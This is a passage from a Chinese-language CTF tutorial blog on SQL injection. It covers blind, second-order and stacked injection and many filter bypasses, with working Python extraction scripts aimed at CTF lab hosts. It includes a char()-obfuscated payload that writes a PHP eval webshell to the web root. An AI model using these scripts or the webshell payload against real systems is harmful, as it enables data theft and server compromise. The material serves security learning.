class="code"><pre><span class="line">#author: c1e4r</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    #题目地址</span><br><span class="line">    url = &#x27;&#x27;&#x27;http://568215bc-57ff-4663-a8d9-808ecfb00f7f.node3.buuoj.cn/index.php?r=Login/Login&#x27;&#x27;&#x27;</span><br><span class="line">    #注入payload</span><br><span class="line">    payloads = &quot;asd&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;</span><br><span class="line">    flag = &#x27;&#x27;</span><br><span class="line">    for i in range(1,30):</span><br><span class="line">        #查询payload</span><br><span class="line">        payload = &quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span><br><span class="line">        for j in range(0,128):</span><br><span class="line">            #将构造好的payload进行16进制转码和json转码</span><br><span class="line">            datas = &#123;&#x27;username&#x27;:payloads.format(str_to_hex(payload.format(i,j))),&#x27;password&#x27;:&#x27;test213&#x27;&#125;</span><br><span class="line">            data = json.dumps(datas)</span><br><span class="line">            times = time.time()</span><br><span class="line">            res = requests.post(url = url, data = data)</span><br><span class="line">            if time.time() - times &gt;= 3:</span><br><span class="line">                flag = flag + chr(j)</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">def str_to_hex(s):</span><br><span class="line">    return &#x27;&#x27;.join([hex(ord(c)).replace(&#x27;0x&#x27;, &#x27;&#x27;) for c in s])</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>这里还涉及到了一些json的内容，json.dumps() 是把python对象转换成json对象的一个过程，生成的是字符串。web服务中传输信息的一种方式。</p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>二次注入用到的SQL语法知识<br>通常二次注入的成因会是插入语句，我们控制自己想要查询的语句插入到数据库中再去找一个能显示插入数据的回显的地方（可能是登陆后的用户名等等、也有可能是删除后显示删除内容的地方~），恶意插入查询语句的示例如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into users(id,username,password,email) values(1,&#x27;0&#x27;+hex(database())+&#x27;0&#x27;,&#x27;0&#x27;+hex(hex(user()))+&#x27;0&#x27;,&#x27;123@qq.com&#x27;)</span><br><span class="line"></span><br><span class="line">insert into users(id,username,password,email) values(1,&#x27;0&#x27;+substr((select hex(hex(select * from flag))),1,10)+&#x27;0&#x27;,&#x27;123456&#x27;,&#x27;123@qq.com&#x27;)</span><br></pre></td></tr></table></figure><p>需要对后端的SQL语句有一个猜测</p><p>这里还有一个点，我们不能直接将要查询的函数插入，因为如果直接插入的话，’database()’会被识别为字符串，我们需要想办法闭合前后单引号的同时将我们的查询插入，就出现了’0’+database()+’0’这样的构造，但是这个的回显是0，但是在我们进行了hex编码之后就能正常的查询了，也就是上面出现的’0’+hex(database())+’0’</p><h3 id="注入流程-3"><a href="#注入流程-3" class="headerlink" title="注入流程"></a>注入流程</h3><p>首先找到插入点，通常情况下是一个注册页面，register.php这种，先简单的查看一下注册后有没有什么注册时写入的信息在之后又回显的，若有回显猜测为二次查询。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into users(id,username,password,email) values(1,&#x27;0&#x27;+hex(database())+&#x27;0&#x27;,&#x27;0&#x27;+hex(hex(user()))+&#x27;0&#x27;,&#x27;123@qq.com&#x27;)</span><br><span class="line"></span><br><span class="line">insert into users(id,username,password,email) values(1,&#x27;0&#x27;+substr((select hex(hex(select * from flag))),1,10)+&#x27;0&#x27;,&#x27;123456&#x27;,&#x27;123@qq.com&#x27;)</span><br></pre></td></tr></table></figure><p>构造类似于values中的参数进行注册等操作，然后进行查看，将hex编码解码即可，可能会有其他的先限制，比如超过10位就会转化为科学计数法，我们就需要使用from for语句来进行一个限制，可以编写脚本。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import re as r</span><br><span class="line">import time</span><br><span class="line">ch = string.ascii_lowercase+string.digits+&#x27;-&#125;&#x27;+&#x27;&#123;&#x27;</span><br><span class="line"></span><br><span class="line">re = requests.session()</span><br><span class="line">url = &#x27;http://9a88c359-4f55-44e9-9332-4c635c486ef0.node3.buuoj.cn/&#x27;</span><br><span class="line"></span><br><span class="line">def register(email,username):</span><br><span class="line">    url1 = url+&#x27;register.php&#x27;</span><br><span class="line">    data = dict(email = email, username = username,password = &#x27;123&#x27;)</span><br><span class="line">    html = re.post(url1,data=data)</span><br><span class="line">    html.encoding = &#x27;utf-8&#x27;</span><br><span class="line">    return html</span><br><span class="line"></span><br><span class="line">def login(email):</span><br><span class="line">    url2 = url+&#x27;login.php&#x27;</span><br><span class="line">    data = dict(email = email,password = &#x27;123&#x27;)</span><br><span class="line">    html = re.post(url2, data=data)</span><br><span class="line">    html.encoding = &#x27;utf-8&#x27;</span><br><span class="line">    return html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hex_flag = &#x27;&#x27;</span><br><span class="line">for j in range(0,17):</span><br><span class="line">    payload = &quot;0&#x27;+(select substr(hex(hex((select * from flag))) from &#123;&#125; for &#123;&#125;))+&#x27;0&quot;.format(int(j)*10+1,10)</span><br><span class="line">    email = &#x27;&#123;&#125;@qq.com&#x27;.format(str(j)+&#x27;14&#x27;)</span><br><span class="line">    html = register(email,payload)</span><br><span class="line">    # print html.text</span><br><span class="line">    html = login(email)</span><br><span class="line">    try:</span><br><span class="line">        res = r.findall(r&#x27;&lt;span class=&quot;user-name&quot;&gt;(.*?)&lt;/span&gt;&#x27;,html.text,r.S)</span><br><span class="line">        hex_flag += str(res[0]).strip()</span><br><span class="line">        print(hex_flag)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    time.sleep(1)</span><br><span class="line">print( hex_flag.decode(&#x27;hex&#x27;).decode(&#x27;hex&#x27;))</span><br></pre></td></tr></table></figure><h2 id="常见绕过"><a href="#常见绕过" class="headerlink" title="常见绕过"></a>常见绕过</h2><h3 id="结尾注释符绕过"><a href="#结尾注释符绕过" class="headerlink" title="结尾注释符绕过"></a>结尾注释符绕过</h3><p>Mysql中常见的注释符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">、#    %23    --+或-- -    ;%00</span><br></pre></td></tr></table></figure><p>如果所有的注释符全部被过滤了，把我们还可以尝试直接使用引号进行闭合，这种方法很好用。</p><h3 id="字符串变换绕过"><a href="#字符串变换绕过" class="headerlink" title="字符串变换绕过"></a>字符串变换绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 大小写绕过</span><br><span class="line">-1&#x27; UnIoN SeLeCt 1,2,database()--+</span><br><span class="line"></span><br><span class="line"># 双写绕过</span><br><span class="line">-1&#x27; uniunionon selselectect 1,2,database()--+</span><br><span class="line"></span><br><span class="line"># 字符串拼接绕过</span><br><span class="line">1&#x27;;set @a=concat(&quot;sel&quot;,&quot;ect * from users&quot;);prepare sql from @a;execute sql;</span><br></pre></td></tr></table></figure><h3 id="过滤-and、or-绕过"><a href="#过滤-and、or-绕过" class="headerlink" title="过滤 and、or 绕过"></a>过滤 and、or 绕过</h3><p>管道符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and =&gt; &amp;&amp;</span><br><span class="line">or =&gt; ||</span><br></pre></td></tr></table></figure><h3 id="使用-进行异或盲注绕过"><a href="#使用-进行异或盲注绕过" class="headerlink" title="使用^进行异或盲注绕过"></a>使用^进行异或盲注绕过</h3><p>异或运算规则:<br>1^1&#x3D;0 0^0&#x3D;0 0^1&#x3D;1<br>1^1^1&#x3D;0 1^1^0&#x3D;0<br>构造payload:’^ascii(mid(database(),1,1)&#x3D;98)^0<br>注意这里会多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的.</p><h3 id="过滤空格绕过"><a href="#过滤空格绕过" class="headerlink" title="过滤空格绕过"></a>过滤空格绕过</h3><p>以下字符可以代替空格：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用注释符/**/代替空格:</span><br><span class="line">select/**/database();</span><br><span class="line"></span><br><span class="line"># 使用加号+代替空格:(只适用于GET方法中)</span><br><span class="line">select+database();</span><br><span class="line"># 注意: 加号+在URL中使⽤记得编码为%2B: select%2Bdatabase(); (python中不用)</span><br><span class="line"></span><br><span class="line"># 使⽤括号嵌套:</span><br><span class="line">select(group_concat(table_name))from(information_schema.taboles)where(tabel_schema=database());</span><br><span class="line"></span><br><span class="line"># 使⽤其他不可⻅字符代替空格:</span><br><span class="line">%09, %0a, %0b, %0c, %0d, %a0</span><br><span class="line"></span><br><span class="line">#利用``分隔进行绕过</span><br><span class="line">select host,user from user where user=&#x27;a&#x27;union(select`table_name`,`table_type`from`information_schema`.`tables`);</span><br></pre></td></tr></table></figure><p>同时任然可以利用异或符号进行盲注，我i们可以看到上面的payload中完全可以不存在空格。</p><h3 id="过滤括号绕过"><a href="#过滤括号绕过" class="headerlink" title="过滤括号绕过"></a>过滤括号绕过</h3><p>利用 order by 进行布尔盲注<br>上面有</p><h3 id="过滤比较符号（-、）绕过"><a href="#过滤比较符号（-、）绕过" class="headerlink" title="过滤比较符号（&#x3D;、&lt;、&gt;）绕过"></a>过滤比较符号（&#x3D;、&lt;、&gt;）绕过</h3><p>比较符号一般也只出现在盲注中，所以都尽可能搭配了脚本。</p><h3 id="使用-in-绕过"><a href="#使用-in-绕过" class="headerlink" title="使用 in() 绕过"></a>使用 in() 绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?id=&#x27; or ascii(substr((select database()),1,1)) in(114)--+    // 错误</span><br><span class="line">/?id=&#x27; or ascii(substr((select database()),1,1)) in(115)--+    // 正常回显</span><br><span class="line"></span><br><span class="line">/?id=&#x27; or substr((select database()),1,1) in(&#x27;s&#x27;)--+    // 正常回显</span><br></pre></td></tr></table></figure><p>综上所述，很明显和普通的布尔盲注差不多，于是写个GET的二分法盲注脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&quot;</span><br><span class="line"></span><br><span class="line">payload = &quot;&#x27; or ascii(substr((select database()),&#123;0&#125;,1)) in(&#123;1&#125;)--+&quot;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    for i in range(1, 100):</span><br><span class="line">        for j in range(37,128):</span><br><span class="line">            url = &quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&#x27; or ascii(substr((select database()),&#123;0&#125;,1)) in(&#123;1&#125;)--+&quot;.format(i,j)</span><br><span class="line">            r = requests.get(url=url)</span><br><span class="line">            if &quot;You are in&quot; in r.text:</span><br><span class="line">                flag += chr(j)</span><br><span class="line">                print(flag)</span><br></pre></td></tr></table></figure><h3 id="LIKE-注入"><a href="#LIKE-注入" class="headerlink" title="LIKE 注入"></a>LIKE 注入</h3><p>在LIKE子句中，百分比(%)通配符允许匹配任何字符串的零个或多个字符。下划线 _ 通配符允许匹配任何单个字符。匹配成功则返回1，反之返回0，可用于sql盲注。</p><ol><li><p>判断数据库长度<br>可用length()函数，也可用_，如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?id=&#x27; or database() like &#x27;________&#x27;--+  // 回显正常</span><br></pre></td></tr></table></figure></li><li><p>判断数据库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?id=&#x27; or database() like &#x27;s%&#x27; --+</span><br><span class="line">/?id=&#x27; or (select database()) like &#x27;s%&#x27; --+</span><br><span class="line">或者:</span><br><span class="line">/?id=&#x27; or database() like &#x27;s_______&#x27; --+</span><br><span class="line">/?id=&#x27; or (select database()) like &#x27;s_______&#x27; --+</span><br></pre></td></tr></table></figure><p>如上图所示，回显正常，说明数据库名的第一个字符是s。</p></li></ol><p>综上所述，很明显和普通的布尔盲注差不多，于是写个GET的二分法盲注脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"># strs = string.printable</span><br><span class="line">strs = string.ascii_letters + string.digits + &#x27;_&#x27;</span><br><span class="line">url = &quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&quot;</span><br><span class="line"></span><br><span class="line">payload = &quot;&#x27; or (select database()) like &#x27;&#123;&#125;%&#x27;--+&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    name = &#x27;&#x27;</span><br><span class="line">    for i in range(1, 40):</span><br><span class="line">        char = &#x27;&#x27;</span><br><span class="line">        for j in strs:</span><br><span class="line">            payloads = payload.format(name + j)</span><br><span class="line">            urls = url + payloads</span><br><span class="line">            r = requests.get(urls)</span><br><span class="line">            if &quot;You are in&quot; in r.text:</span><br><span class="line">                name += j</span><br><span class="line">                print(j, end=&#x27;&#x27;)</span><br><span class="line">                char = j</span><br><span class="line">                break</span><br><span class="line">        if char == &#x27;#&#x27;:</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><h3 id="REGEXP-注入"><a href="#REGEXP-注入" class="headerlink" title="REGEXP 注入"></a>REGEXP 注入</h3><p>REGEXP注入，即regexp正则表达式注入。REGEXP注入，又叫盲注值正则表达式攻击。应用场景就是盲注，原理是直接查询自己需要的数据，然后通过正则表达式进行匹配。</p><ol><li><p>判断数据库长度</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?id=&#x27; or (length(database())) regexp 8 --+  // 回显正常</span><br></pre></td></tr></table></figure></li><li><p>判断数据库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?id=&#x27; or database() regexp &#x27;^s&#x27;--+    // 回显正常</span><br><span class="line">/?id=&#x27; or database() regexp &#x27;se&#x27;--+    // 回显正常, 不适用^和$进行匹配也可以</span><br><span class="line">/?id=&#x27; or database() regexp &#x27;^sa&#x27;--+   // 报错</span><br><span class="line">/?id=&#x27; or database() regexp &#x27;y$&#x27;--+    // 回显正常</span><br></pre></td></tr></table></figure></li></ol><p>脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"># strs = string.printable</span><br><span class="line">strs = string.ascii_letters + string.digits + &#x27;_&#x27;</span><br><span class="line">url = &quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&quot;</span><br><span class="line"></span><br><span class="line">payload = &quot;&#x27; or (select database()) regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    name = &#x27;&#x27;</span><br><span class="line">    for i in range(1, 40):</span><br><span class="line">        char = &#x27;&#x27;</span><br><span class="line">        for j in strs:</span><br><span class="line">            payloads = payload.format(name + j)</span><br><span class="line">            urls = url + payloads</span><br><span class="line">            r = requests.get(urls)</span><br><span class="line">            if &quot;You are in&quot; in r.text:</span><br><span class="line">                name += j</span><br><span class="line">                print(j, end=&#x27;&#x27;)</span><br><span class="line">                char = j</span><br><span class="line">                break</span><br><span class="line">        if char == &#x27;#&#x27;:</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>以上脚本都要注意是掌握编写思路，不是干抄脚本。</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>前置知识</p><p><strong>magic_quotes_gpc （魔术引号开关</strong><br>magic_quotes_gpc函数在php中的作用是判断解析用户提交的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。</p><p>单引号（’）、双引号（”）、反斜线（\）等字符都会被加上反斜线，我们输入的东西如果不能闭合，那我们的输入就不会当作代码执行，就无法产生SQL注入。</p><p><strong>addslashes()函数</strong></p><p>返回在预定义字符之前添加反斜杠的字符串</p><p>预定义字符：单引号（’），双引号（”），反斜杠（\），NULL</p><p>宽字节概念：</p><ol><li>单字节字符集：所有的字符都使用一个字节来表示，比如 ASCII 编码(0-127)</li><li>多字节字符集：在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。</li><li>UTF-8 编码： 是一种编码的编码方式（多字节编码），它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。</li><li>常见的宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS GB2312 不存在宽字节注入，可以收集存在宽字节注入的编码。</li><li>宽字节注入时利用mysql的一个特性，使用GBK编码的时候，会认为两个字符是一个汉字</li></ol><p>宽字节SQL注入主要是源于程序员设置数据库编码为非英文编码那么就有可能产生宽字节注入。</p><p>例如说MySql的编码设置为了SET NAMES ‘gbk’或是 SET character_set_client &#x3D;gbk，这样配置会引发编码转换从而导致的注入漏洞。</p><p>宽字节SQL注入的根本原因:</p><p>宽字节SQL注入就是PHP发送请求到MySql时使用了语句</p><p>SET NAMES ‘gbk’ 或是SET character_set_client &#x3D;gbk 进行了一次编码，但是又由于一些不经意的字符集转换导致了宽字节注入。</p><p>magic_quotes_gpc的作用：当PHP的传参中有特殊字符就会在前面加转义字符’’,来做一定的过滤</p><p>为了绕过magic_quotes_gpc的,于是乎我们开始导入宽字节的概念</p><p>我们发现\的编码是%5c，然后我们会想到传参一个字符想办法凑成一个gbk字符,例如：‘運’字是%df%5c</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1\&#x27;&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure><p>这条语句因为\使我们无法去注入，那么我们是不是可以用%df吃到%5c,因为如果用GBK编码的话这个就是運，然后成功绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1�\&#x27;#&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure><p>虽然是写在了过滤引号的位置但是其实不止适用于过滤引号<br>使用反斜杠 \ 逃逸 Sql 语句<br>如果没有过滤反斜杠的话，我们可以使用反斜杠将后面的引号转义，从而逃逸后面的 Sql 语句。</p><p>假设sql语句为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select username, password from users where username=&#x27;$username&#x27; and password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure><p>假设输入的用户名是 admin\，密码输入的是 or 1# 整个SQL语句变成了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select username,password from users where username=&#x27;admin\&#x27; and password=&#x27; or 1#&#x27;</span><br></pre></td></tr></table></figure><p>由于单引号被转义，and password&#x3D;这部分都成了username的一部分，即</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=&#x27;admin\&#x27; and password=&#x27;</span><br></pre></td></tr></table></figure><p>这样 or 1 就逃逸出来了，由此可控，可作为注入点了。</p><h3 id="堆叠注入时利用-MySql-预处理"><a href="#堆叠注入时利用-MySql-预处理" class="headerlink" title="堆叠注入时利用 MySql 预处理"></a>堆叠注入时利用 MySql 预处理</h3><p>在遇到堆叠注入时，如果select、rename、alter和handler等语句都被过滤的话，我们可以用MySql预处理语句配合concat拼接来执行sql语句拿flag。</p><ol><li>PREPARE：准备一条SQL语句，并分配给这条SQL语句一个名字(hello)供之后调用</li><li>EXECUTE：执行命令</li><li>DEALLOCATE PREPARE：释放命令</li><li>SET：用于设置变量(@a)</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;sEt @a=concat(&quot;sel&quot;,&quot;ect flag from flag_here&quot;);PRepare hello from @a;execute hello;#</span><br></pre></td></tr></table></figure><p>这里还用大小写简单绕了一下其他过滤</p><p><strong>MySql 预处理配合十六进制绕过关键字</strong><br>基本原理如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select hex(&#x27;show databases&#x27;);</span><br><span class="line">+------------------------------+</span><br><span class="line">| hex(&#x27;show databases;&#x27;)       |</span><br><span class="line">+------------------------------+</span><br><span class="line">| 73686F7720646174616261736573 |</span><br><span class="line">+------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; set @b=0x73686F7720646174616261736573;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; prepare test from @b;</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line">Statement prepared</span><br><span class="line"></span><br><span class="line">mysql&gt; execute test;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| challenges         |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| security           |</span><br><span class="line">| test               |</span><br><span class="line">+--------------------+</span><br><span class="line">6 rows in set (0.02 sec)</span><br></pre></td></tr></table></figure><p>即payload类似如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;sEt @a=0x73686F7720646174616261736573;PRepare hello from @a;execute hello;#</span><br></pre></td></tr></table></figure><p><strong>MySql预处理配合字符串拼接绕过关键字</strong><br>原理就是借助char()函数将ascii码转化为字符然后再使用concat()函数将字符连接起来，有了前面的基础这里应该很好理解了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @sql=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(39),char(60),char(63),char(112),char(104),char(112),char(32),char(101),char(118),char(97),char(108),char(40),char(36),char(95),char(80),char(79),char(83),char(84),char(91),char(119),char(104),char(111),char(97),char(109),char(105),char(93),char(41),char(59),char(63),char(62),char(39),char(32),char(105),char(110),char(116),char(111),char(32),char(111),char(117),char(116),char(102),char(105),char(108),char(101),char(32),char(39),char(47),char(118),char(97),char(114),char(47),char(119),char(119),char(119),char(47),char(104),char(116),char(109),char(108),char(47),char(102),char(97),char(118),char(105),char(99),char(111),char(110),char(47),char(115),char(104),char(101),char(108),char(108),char(46),char(112),char(104),char(112),char(39),char(59));prepare s1 from @sql;execute s1;</span><br></pre></td></tr></table></figure><p>也可以不用concat函数，直接用char函数也具有连接功能：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,119,104,111,97,109,105,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare s1 from @sql;execute s1;</span><br></pre></td></tr></table></figure><h3 id="过滤逗号绕过"><a href="#过滤逗号绕过" class="headerlink" title="过滤逗号绕过"></a>过滤逗号绕过</h3><p>当逗号被过滤了之后，我们便不能向下面这样正常的时候substr()函数和limit语句了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substr((select database()),1,1);</span><br><span class="line">select * from users limit 0,1;</span><br></pre></td></tr></table></figure><p><strong>使用from…for…绕过</strong><br>我们可以使用 from…for.. 语句替换 substr() 函数里的 ,1,1：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substr((select database()) from 1 for 1);</span><br><span class="line"># 此时 from 1 for 1 中的两个1分别代替 substr() 函数里的两个1</span><br><span class="line"></span><br><span class="line">select substr((select database()) from 1 for 1);    # s</span><br><span class="line">select substr((select database()) from 2 for 1);    # e</span><br><span class="line">select substr((select database()) from 3 for 1);    # c</span><br><span class="line">select substr((select database()) from 4 for 1);    # u</span><br><span class="line">select substr((select database()) from 5 for 1);    # r</span><br><span class="line">select substr((select database()) from 6 for 1);    # i</span><br><span class="line">select substr((select database()) from 7 for 1);    # t</span><br><span class="line">select substr((select database()) from 8 for 1);    # y</span><br><span class="line"></span><br><span class="line"># 如果过滤了空格, 则可以使用括号来代替空格:</span><br><span class="line">select substr((select database())from(1)for(1));    # s</span><br><span class="line">select substr((select database())from(2)for(1));    # e</span><br><span class="line">select substr((select database())from(3)for(1));    # c</span><br><span class="line">select substr((select database())from(4)for(1));    # u</span><br><span class="line">select substr((select database())from(5)for(1));    # r</span><br><span class="line">select substr((select database())from(6)for(1));    # i</span><br><span class="line">select substr((select database())from(7)for(1));    # t</span><br><span class="line">select substr((select database())from(8)for(1));    # y</span><br></pre></td></tr></table></figure><p>即，from用来指定从何处开始截取，for用来指定截取的长度，如果不加for的话则 from 1 就相当于从字符串的第一位一直截取到最后：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substr((select database()) from 1);    # security</span><br><span class="line">select substr((select database()) from 2);    # ecurity</span><br><span class="line">select substr((select database()) from 3);    # curity</span><br><span class="line">select substr((select database()) from 4);    # urity</span><br><span class="line">select substr((select database()) from 5);    # rity</span><br><span class="line">select substr((select database()) from 6);    # ity</span><br><span class="line">select substr((select database()) from 7);    # ty</span><br><span class="line">select substr((select database()) from 8);    # y</span><br><span class="line"></span><br><span class="line"># 也可以使用负数来倒着截取:</span><br><span class="line">select substr((select database())from(-1));    # y</span><br><span class="line">select substr((select database())from(-2));    # ty</span><br><span class="line">select substr((select database())from(-3));    # ity</span><br><span class="line">select substr((select database())from(-4));    # rity</span><br><span class="line">select substr((select database())from(-5));    # urity</span><br><span class="line">select substr((select database())from(-6));    # curity</span><br><span class="line">select substr((select database())from(-7));    # ecurity</span><br><span class="line">select substr((select database())from(-8));    # security</span><br></pre></td></tr></table></figure><p><strong>使用offset关键字绕过</strong><br>我们可以使用 offset 语句替换 limit 语句里的逗号：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users limit 1 offset 2;</span><br><span class="line"># 此时 limit 1 offset 2 可以代替 limit 1,2</span><br></pre></td></tr></table></figure><p><strong>利用join与别名绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select host,user from user where user=&#x27;a&#x27;union(select*from((select`table_name`from`information_schema`.`tables`where`table_schema`=&#x27;mysql&#x27;)`a`join(select`table_type`from`information_schema`.`tables`where`table_schema`=&#x27;mysql&#x27;)b));</span><br></pre></td></tr></table></figure><p><strong>过滤information_schema绕过与无列名注入</strong></p><p>当过滤or时，这个库就会被过滤，那么mysql在被waf禁掉了information_schema库后还能有哪些利用思路呢？</p><p>information_schema 简单来说，这个库在mysql中就是个信息数据库，它保存着mysql服务器所维护的所有其他数据库的信息，包括了数据库名，表名，字段名等。在注入中，infromation_schema库的作用无非就是可以获取到table_schema、table_name、column_name这些数据库内的信息。</p><p>能够代替information_schema的有：<br>sys.schema_auto_increment_columns 只显示有自增的表<br>sys.schema_table_statistics_with_buffer<br>x$schema_table_statistics_with_buffer</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where id = -1 union all select 1,2,3,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database();</span><br></pre></td></tr></table></figure><p>mysql.innodb_table_stats<br>mysql.innodb_table_index</p><p>以上大部分特殊数据库都是在 mysql5.7 以后的版本才有，并且要访问sys数据库需要有相应的权限。</p><p>但是在使用上面的后两个表来获取表名之后select group_concat(table_name) from mysql.innodb_table_stats，我们是没有办法获得列的，这个时候就要采用无列名注入的办法。</p><h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><p>123法<br>我们可以利用一些查询上的技巧来进行无列名、表名的注入。</p><p>在我们直接select 1,2,3时，会创建一个虚拟的表<br><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/chencicici/images/main/202206241559936.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://raw.githubusercontent.com/chencicici/images/main/202206241559936.png" alt="img"></a></p><p>如图所见列名会被定义为1，2，3</p><p>当我们结合了union联合查询之后</p><p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/chencicici/images/main/202206241559064.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://raw.githubusercontent.com/chencicici/images/main/202206241559064.png" alt="img"></a></p><p>如图，我们的列名被替换为了对应的数字。也就是说，我们可以继续数字来对应列，如 3 对应了表里面的 password，进而我们就可以构造这样的查询语句来查询password：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select `3` from (select 1,2,3 union select * from users)a;</span><br></pre></td></tr></table></figure><p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/chencicici/images/main/202206241600996.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://raw.githubusercontent.com/chencicici/images/main/202206241600996.png" alt="img"></a><br>末尾的 a 可以是任意字符，用于命名</p><p>当然，多数情况下，反引号会被过滤。当反引号不能使用的时候，可以使用别名来代替：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select b from (select 1,2,3 as b union select * from admin)a;</span><br></pre></td></tr></table></figure><p>join<br>我们可以利用爆错，借助join和using爆出列名，id为第一列，username为第二列，可以逐个爆出，爆出全部列名之后即可得到列内数据。<br><a target="_blank" rel="noopener" 